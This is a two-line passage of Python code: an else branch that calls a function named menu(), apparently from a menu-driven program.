    else: 
        menu()